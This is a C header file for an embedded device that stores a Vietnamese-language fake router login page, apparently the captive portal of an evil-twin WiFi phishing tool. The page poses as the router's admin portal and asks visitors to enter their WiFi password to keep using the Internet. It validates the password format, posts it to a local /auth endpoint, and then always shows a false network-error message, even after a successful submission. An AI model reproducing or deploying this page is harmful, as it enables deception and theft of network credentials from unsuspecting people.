#ifndef WEB_AUTH2_PAGE_H
#define WEB_AUTH2_PAGE_H

// Classic router auth page
const char WEB_AUTH2_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ROUTER KHÔNG DÂY · CỔNG QUẢN TRỊ</title>
  <style>
    body { font-family: Arial, Helvetica, sans-serif; background:#f2f2f2; color:#333; margin:0; }
    .topbar { background:#2c3e50; color:#ecf0f1; padding:10px 14px; font-size:14px; }
    .container { max-width:720px; margin:24px auto; background:#fff; border:1px solid #c9c9c9; }
    .header { background:#f7f7f7; border-bottom:1px solid #dcdcdc; padding:12px 16px; }
    .header h1 { margin:0; font-size:18px; }
    .header .sub { color:#666; font-size:12px; margin-top:4px; }
    .content { padding:16px; }
    .info { background:#fcfcfc; border:1px solid #e5e5e5; padding:10px 12px; margin-bottom:16px; font-size:13px; color:#555; }
    table { width:100%; border-collapse:collapse; }
    th, td { padding:8px 10px; border:1px solid #e0e0e0; font-size:13px; }
    th { width:180px; text-align:right; background:#fafafa; color:#555; }
    input[type=password] { width:240px; padding:6px 8px; border:1px solid #bbb; border-radius:2px; font-size:13px; }
    .actions { padding-top:12px; }
    .btn { background:#2d89ef; color:#fff; border:0; padding:8px 16px; border-radius:2px; cursor:pointer; font-weight:bold; position:relative; }
    .btn:disabled { background:#999; cursor:not-allowed; }
    .spinner { display:none; width:14px; height:14px; border:2px solid #fff; border-top:2px solid transparent; border-radius:50%; animation:spin 1s linear infinite; margin-right:6px; }
    @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
    .muted { color:#888; font-size:12px; margin-top:10px; }
    .footer { background:#f7f7f7; border-top:1px solid #dcdcdc; padding:10px 14px; color:#777; font-size:12px; text-align:center; }
  </style>
</head>
<body>
  <div class="topbar">ROUTER KHÔNG DÂY · CỔNG QUẢN TRỊ</div>
  <div class="container">
    <div class="header">
      <h1>ĐĂNG NHẬP</h1>
      <div class="sub">Mạng hiện tại: {SSID}</div>
    </div>
    <div class="content">
      <div class="info">Để bảo mật mạng, vui lòng nhập mật khẩu WiFi để xác thực và tiếp tục truy cập Internet.</div>
      <form onsubmit="submitText(); return false;">
        <table>
          <tr>
            <th>Mạng không dây (SSID):</th>
            <td>{SSID}</td>
          </tr>
          <tr>
            <th>Mật khẩu:</th>
            <td><input id="text" type="password" placeholder="Mật khẩu" maxlength="64" minlength="8"></td>
          </tr>
        </table>
        <div class="actions">
          <button id="submitBtn" class="btn" type="submit">
            <span class="spinner" id="spinner"></span>
            <span id="btnText">Đăng nhập</span>
          </button>
          <div class="muted">Vui lòng nhập mật khẩu để kết nối</div>
        </div>
      </form>
    </div>
    <div class="footer">© 2025 Router Không Dây · Phiên bản 1.0.0</div>
  </div>
  <script>
    function isValidWifiPassword(p){
      if(!p) return false;
      var len = p.length;
      return (len >= 8 && len <= 63 && /^[\x20-\x7E]+$/.test(p)) || 
             (len === 64 && /^[0-9A-Fa-f]{64}$/.test(p));
    }
    function submitText(){
      var v = (document.getElementById('text').value||'').trim();
      if(!isValidWifiPassword(v)){
        alert('Định dạng mật khẩu không hợp lệ');
        return;
      }
      var btn = document.getElementById('submitBtn');
      var spinner = document.getElementById('spinner');
      var btnText = document.getElementById('btnText');
      
      btn.disabled = true;
      spinner.style.display = 'inline-block';
      btnText.textContent = 'Đang đăng nhập...';
      
      fetch('/auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:v})})
        .then(function(r){return r.json();})
        .then(function(j){ alert(j&&j.success?'Lỗi mạng, thử lại!':'Gửi thất bại, hãy tải lại trang'); })
        .catch(function(){ alert('Lỗi mạng'); })
        .finally(function(){
          btn.disabled = false;
          spinner.style.display = 'none';
          btnText.textContent = 'Đăng nhập';
        });
    }
  </script>
</body>
</html>
)rawliteral";

#endif


